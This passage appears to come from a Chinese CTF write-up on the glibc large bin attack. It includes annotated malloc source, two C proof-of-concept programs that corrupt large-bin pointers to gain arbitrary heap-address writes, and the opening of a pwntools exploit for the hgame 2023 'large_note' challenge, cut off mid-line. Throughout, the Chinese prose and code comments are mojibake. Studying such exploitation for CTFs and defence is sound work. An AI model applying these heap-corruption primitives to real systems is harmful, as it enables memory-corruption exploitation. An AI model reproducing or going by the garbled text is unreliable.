class="hljs-comment">//fwdå®šä½è‡³ç¬¬ä¸€ä¸ªchunké“¾ï¼Œbckå®šä½è‡³æœ€åä¸€ä¸ªchunké“¾</span><br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br><span class="hljs-comment">//fd_nextsizeæŒ‡å‘æœ€å¤§çš„zhunké“¾ï¼Œbk_nextsizeæŒ‡å‘æœ€å°çš„chunké“¾</span><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><span class="hljs-comment">//victimæˆä¸ºæœ€å°çš„chunké“¾å’Œæœ€å¤§çš„chunké“¾è¿æ¥</span><br><span class="hljs-comment">//åŸæœ€å°çš„chunké“¾å’Œvictimè¿æ¥æˆä¸ºç¬¬äºŒå°çš„chunké“¾</span><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br><span class="hljs-comment">//fwdä»å¤§åˆ°å°ç§»åŠ¨ç›´è‡³å°äºç­‰äºvictim</span><br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br><span class="hljs-comment">//å¦‚æœvctimå’Œfwdå¤§å°ç›¸ç­‰</span><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br><span class="hljs-comment">//fwdå®šä½è‡³è¯¥å°chunké“¾çš„ç¬¬äºŒä¸ªchunk</span><br>                        fwd = fwd-&gt;fd;<br><span class="hljs-comment">//fwdæ˜¯æ¯”victimå°çš„æœ€å¤§çš„chunké“¾</span><br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br><span class="hljs-comment">//chunké“¾è¿æ¥åŒä¸Š</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br><span class="hljs-comment">//bckå®šä½è‡³æ¯”victimå¤§çš„ç¬¬ä¸€ä¸ªchunké“¾</span><br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br><span class="hljs-comment">//fwdæ˜¯victimçš„fdï¼Œbckæ˜¯victimçš„bk</span><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨ä¸€"><a href="#åˆ©ç”¨ä¸€" class="headerlink" title="åˆ©ç”¨ä¸€"></a>åˆ©ç”¨ä¸€</h1><p>è¿™ç§åˆ©ç”¨æ–¹æ³•åˆ©ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br></code></pre></td></tr></table></figure><p>å®ç°æ•ˆæœä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€<br><a href="https://blog.csdn.net/qq_41252520/article/details/126211062">å®éªŒä»£ç </a>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> g_Target = <span class="hljs-number">0xABCDEF20220807</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* large_chunk1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span>);<br>    <span class="hljs-type">char</span>* pad1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">char</span>* large_chunk2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span>);<br>    <span class="hljs-type">char</span>* pad2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk1);<br>    <span class="hljs-type">char</span>* pad3 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk2);<br><br>    *(<span class="hljs-type">size_t</span>*)(large_chunk1+<span class="hljs-number">0x18</span>)=((<span class="hljs-type">size_t</span>)&amp;g_Target)<span class="hljs-number">-0x20</span>;<br>    <br>    <span class="hljs-type">char</span>* p1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>å…ˆç”³è¯·å››ä¸ªchunkï¼Œå…¶ä¸­pad1ã€pad2ç”¨äºéš”ç¦»ï¼Œé˜²æ­¢åˆå¹¶</li><li>é‡Šæ”¾chunk1è¿›å…¥unsorted bin</li><li>ç”³è¯·pad3ï¼Œunsorted binä¸­çš„chunk1æ”¾è¿›large binï¼Œæ­¤æ—¶chunk1çš„fd_nextsizeå’Œbk_nextsizeéƒ½æŒ‡å‘è‡ªå·±</li><li>é‡Šæ”¾chunk2ï¼Œchunk2è¿›å…¥unsorted bin</li><li>æ›´æ”¹chunk1çš„bk_nextsizeä¸ºg_Target-0x20</li><li>ç”³è¯·ä¸€ä¸ªchunkï¼Œchunk2è¿›å…¥large binã€‚ç”±äºchunk2å°äºchunk1ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<br>fwd = bck-&gt;fd;<br><br>â€¦â€¦<br><br>fwd = bck;<br>bck = bck-&gt;bk;<span class="hljs-comment">//chunk1</span><br><br>victim-&gt;fd_nextsize = fwd-&gt;fd;<br><span class="hljs-comment">//chunk2-&gt;fd_nextsize=chunk1</span><br>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk1-&gt;bk_nextsize=g_Target-0x20</span><br>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk1-&gt;bk_nextsize=chunk2</span><br><span class="hljs-comment">//(g_Target-0x20)-&gt;fd_nextsize=*g_Target=chunk2</span><br></code></pre></td></tr></table></figure></li><li>æ›´æ”¹æˆåŠŸ<br>psï¼šç¤ºæ„å›¾å¦‚ä¸‹ï¼š <img src="/2023/01/25/large-bin-attack/1.jpg" class title="æ­¥éª¤ä¸€"><img src="/2023/01/25/large-bin-attack/2.jpg" class title="æ­¥éª¤äºŒ"><img src="/2023/01/25/large-bin-attack/3.jpg" class title="æ­¥éª¤ä¸‰"></li></ul><h2 id="åˆ©ç”¨æ­¥éª¤"><a href="#åˆ©ç”¨æ­¥éª¤" class="headerlink" title="åˆ©ç”¨æ­¥éª¤"></a>åˆ©ç”¨æ­¥éª¤</h2><ul><li>mallocä¸€å—size1å¤§å°çš„large chunkï¼ˆchunk1ï¼‰</li><li>mallocä¸€å—éšä¾¿å¤§å°çš„chunkï¼ˆé˜²æ­¢åˆå¹¶ï¼‰</li><li>mallocä¸€å—size2å¤§å°çš„large chunkï¼Œè¦æ±‚size2&lt;size1ä¸”size1å’Œsize2åœ¨åŒä¸€ä¸ªlarge binèŒƒå›´å†…</li><li>mallocä¸€å—éšä¾¿å¤§å°çš„chunkï¼ˆé˜²æ­¢åˆå¹¶ï¼‰</li><li>freeï¼ˆchunk1ï¼‰ï¼Œchunk1è¿›å…¥unsorted bin</li><li>mallocä¸€å—size3çš„large chunkï¼Œè¦æ±‚size3&gt;size1ï¼ˆä¸è§¦å‘åˆ†å‰²ï¼‰ï¼Œchunk1è¿›å…¥large bin</li><li>freeï¼ˆchunk2ï¼‰ï¼Œchunk2è¿›å…¥unsorted bin</li><li>ä¿®æ”¹chunk1-&gt;bk_nextsize&#x3D;Target-0x20</li><li>mallocä¸€å—chunkï¼ˆå¤§å°ä¸ç­‰äºsize2ï¼‰ï¼Œchunk2è¿›å…¥large binï¼Œè§¦å‘large bin attack</li></ul><h1 id="åˆ©ç”¨äºŒ"><a href="#åˆ©ç”¨äºŒ" class="headerlink" title="åˆ©ç”¨äºŒ"></a>åˆ©ç”¨äºŒ</h1><h2 id="2-30ä»¥å‰"><a href="#2-30ä»¥å‰" class="headerlink" title="2.30ä»¥å‰"></a>2.30ä»¥å‰</h2><p>è¿™ç§æ–¹æ³•åˆ©ç”¨çš„æ˜¯ç¬¬äºŒä¸ªelseï¼Œå®ç°æ•ˆæœæ˜¯ä»»æ„åœ°å€å†™ä¸¤ä¸ªå †åœ°å€<br>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆå®éªŒä»£ç æ¥æºäºhow2heapä»£ç ï¼Œåˆ é™¤äº†ä¸€äº›è¾“å‡ºï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">free</span>(p3);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>mallocä¸€ä¸ªsize1çš„chunkï¼ˆchunk1ï¼‰</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>mallocä¸€ä¸ªsize2çš„chunkï¼ˆchunk2ï¼‰ï¼Œè¦æ±‚size1&lt;size2</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>mallocä¸€ä¸ªsize3çš„chunkï¼ˆchunk3ï¼‰ï¼Œè¦æ±‚size2&lt;size3ä¸”åœ¨ä¸€ä¸ªlarge binçš„èŒƒå›´å†…</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>freeæ‰chunk1å’Œchunk2ï¼Œè¿›å…¥unsorted bin</li><li>mallocä¸€ä¸ªsize4çš„chunkï¼Œchunk1å’Œchunk2å…ˆè¿›å…¥large binï¼Œç„¶ååˆ‡å‰²chunk1è¿”å›ï¼Œå‰©ä¸‹çš„chunk1_leftè¢«æ”¾å…¥unsorted bin</li><li>freeæ‰chunk3ï¼Œchunk3æ”¾è¿›unsorted bin</li><li>ä¿®æ”¹chunk2å¦‚ä¸‹ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">ä¿®æ”¹å‰ï¼š<br>chunk2<br>size-&gt; size2<br>fd-&gt; large bin<br>bk-&gt; large bin<br>fd_nextsize-&gt; chunk2<br>bk_nextsize-&gt; chunk2<br><br>ä¿®æ”¹åï¼š<br>chunk2<br>size-&gt; size2<br>fd-&gt; null<br>bk-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize-&gt; null<br>bk_nextsize-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li><li>éšä¾¿mallocä¸€ä¸ªchunkï¼Œchunk1_leftè¿›å…¥small binï¼Œchunk3æ”¾è¿›large binï¼Œç„¶åä»chunk1_leftä¸­åˆ‡å‰²è¿”å›ï¼ˆå‰©ä¸‹çš„æ”¾è¿›unsorted binï¼‰<br>é‡ç‚¹åˆ†æä¸‹chunk3æ”¾è¿›large binè¿™ä¸€æ­¥ï¼š<br>ç”±äºsize2&lt;size3ï¼Œæ‰€ä»¥chunk3ä¼šæ’å…¥chunk2å’Œlarge binä¸­é—´ï¼Œæ‰§è¡Œelseä¸­çš„ç¬¬äºŒä¸ªelseéƒ¨åˆ†ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<span class="hljs-comment">//large bin</span><br>fwd = bck-&gt;fd;<span class="hljs-comment">//chunk2</span><br><br>â€¦â€¦<br><br>victim-&gt;fd_nextsize = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd_nextsize=chunk2</span><br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize=chunk2-&gt;bk_nextsize=target2-0x20</span><br>fwd-&gt;bk_nextsize = victim;<br><span class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk3</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize-&gt;fd_nextsize=</span><br><span class="hljs-comment">//(target2-0x20)-&gt;fd_nextsize=chunk3</span><br><span class="hljs-comment">//target2=chunk3</span><br>bck = fwd-&gt;bk;<br><span class="hljs-comment">//bck=chunk2-&gt;bk=target1-0x10</span><br><br>â€¦â€¦<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br><span class="hljs-comment">//chunk3-&gt;bk=target1-0x10</span><br>victim-&gt;fd = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd=chunk2</span><br>fwd-&gt;bk = victim;<br><span class="hljs-comment">//chunk2-&gt;bk=chunk3</span><br>bck-&gt;fd = victim;<br><span class="hljs-comment">//(target1-0x10)-&gt;fd=chunk3</span><br><span class="hljs-comment">//target1=chunk3</span><br></code></pre></td></tr></table></figure></li><li>æ›´æ”¹æˆåŠŸ<br>psï¼šç¤ºæ„å›¾å¦‚ä¸‹ï¼š<img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%89%8D.jpg" class title="æ›´æ”¹å‰"><img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%90%8E.jpg" class title="æ›´æ”¹å"><img src="/2023/01/25/large-bin-attack/1-1.jpg" class title="2æ­¥éª¤ä¸€"><img src="/2023/01/25/large-bin-attack/1-2.jpg" class title="2æ­¥éª¤äºŒ"><img src="/2023/01/25/large-bin-attack/1-3.jpg" class title="2æ­¥éª¤ä¸‰"><img src="/2023/01/25/large-bin-attack/1-4.jpg" class title="2æ­¥éª¤å››"></li></ul><h3 id="åˆ©ç”¨æ­¥éª¤-1"><a href="#åˆ©ç”¨æ­¥éª¤-1" class="headerlink" title="åˆ©ç”¨æ­¥éª¤"></a>åˆ©ç”¨æ­¥éª¤</h3><ul><li>mallocä¸€ä¸ªsize1çš„chunkï¼ˆchunk1ï¼‰</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>mallocä¸€ä¸ªsize2çš„chunkï¼ˆchunk2ï¼‰ï¼Œè¦æ±‚size1&lt;size2</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>mallocä¸€ä¸ªsize3çš„chunkï¼ˆchunk3ï¼‰ï¼Œè¦æ±‚size2&lt;size3ä¸”åœ¨ä¸€ä¸ªlarge binçš„èŒƒå›´å†…</li><li>mallocéšä¾¿ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶</li><li>freeæ‰chunk1å’Œchunk2</li><li>mallocä¸€ä¸ªsize4çš„chunkï¼Œè¦æ±‚size1-size4å±äºsmall bin</li><li>freeæ‰chunk3</li><li>ä¿®æ”¹chunk2å¦‚ä¸‹ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk2<br>size-&gt; size2<br>fd-&gt; null<br>bk-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize-&gt; null<br>bk_nextsize-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li><li>éšä¾¿mallocä¸€ä¸ªchunkï¼Œsize&lt;size1-size4ï¼Œè§¦å‘large bin attack</li></ul><h2 id="2-30ä»¥å"><a href="#2-30ä»¥å" class="headerlink" title="2.30ä»¥å"></a>2.30ä»¥å</h2><p>å¢åŠ æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br><br>â€¦â€¦<br><br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨äºŒä¸æˆç«‹äº†ï¼Œåªèƒ½ä½¿ç”¨åˆ©ç”¨ä¸€</p><h1 id="ä¾‹é¢˜hgame-2023-week3-large-note"><a href="#ä¾‹é¢˜hgame-2023-week3-large-note" class="headerlink" title="ä¾‹é¢˜hgame 2023 week3 large_note"></a>ä¾‹é¢˜hgame 2023 week3 large_note</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>çœ‹åˆ°è¿™ä¸ªåå­—ç¬¬ä¸€ååº”å°±æ˜¯large bin attackï¼Œä½†å‚è§ä¸Šæ–‡â†‘ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™ä¸ªæ¼æ´å¾ˆé¸¡è‚‹ä¸çŸ¥é“æ€ä¹ˆç”¨ã€‚ç›´åˆ°æˆ‘åŠå¤œæœåˆ°ğŸ‘‰<a href="https://blog.csdn.net/qq_33590156/article/details/121716696">è¿™ä¸ª</a>ğŸ‘ˆ<br>è¿™é“é¢˜æœ€å¤§çš„é—®é¢˜å°±æ˜¯ç”³è¯·çš„chunkè¿‡å¤§ä¸åœ¨tcacheçš„èŒƒå›´å†…ï¼Œä¸èƒ½uafã€‚ä½†large bin attackå¯ä»¥åœ¨tcache_max_binå¤„å†™ä¸‹å¤§è‡³ï¼Œä½¿å¾—æ›´å¤§çš„chunkèƒ½å¤Ÿæ”¾è¿›tcacheå°±å¯ä»¥uafäº†ï¼ˆtcache_max_binåœ¨mp_+80çš„åœ°æ–¹ï¼Œæœ¬èº«å€¼ä¸º0x40ï¼‰ï¼Œå…·ä½“æ“ä½œè§ä¸Š<br>ä¹‹åæ­¥éª¤åŒsafe_note</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br><span class="hljs-comment">#p=process(&#x27;./large&#x27;)</span><br>p=remote(<span 